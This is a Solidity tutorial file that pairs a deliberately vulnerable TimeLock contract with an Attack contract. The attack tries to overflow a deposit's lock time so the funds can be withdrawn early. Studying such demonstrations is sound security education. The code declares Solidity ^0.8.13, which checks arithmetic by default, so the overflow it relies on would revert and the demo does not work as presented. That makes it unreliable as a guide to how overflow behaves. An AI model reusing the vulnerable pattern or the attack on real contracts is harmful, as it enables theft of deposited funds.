// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Overflow / Underflow
Code & Demo
Preventative techiniques
*/

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract TimeLock {
    using SafeMath for uint; // myUint.add(123)

    mapping (address => uint) public balances;
    mapping (address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
        // lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient Funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to Sent Ether");
    }
    
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        // t = current lock time
        // find x such that
        // x + t = 2 ** 256 = 0
        // x = -t
        timeLock.increaseLockTime(type(uint).max + 1 - timeLock.lockTime(address(this)));
        timeLock.withdraw();
    }
}